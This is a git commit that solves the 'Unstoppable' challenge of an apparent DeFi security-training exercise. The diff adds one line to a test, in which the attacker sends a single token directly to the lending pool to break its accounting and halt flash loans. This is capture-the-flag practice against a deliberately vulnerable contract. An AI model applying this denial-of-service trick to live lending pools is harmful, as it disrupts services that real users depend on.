54d8610ac0abb6f71878f3ea41dbc6b4a3616496
sogasg <sogasg@gmail.com>
2021-11-03 12:18:36 +0100

    Challenge #1 - Unstoppable done

--- test/unstoppable/unstoppable.challenge.js
+++ test/unstoppable/unstoppable.challenge.js
@@ -40,6 +40,7 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        await this.token.connect(attacker).transfer(this.pool.address , 1);
     });
 
     after(async function () {
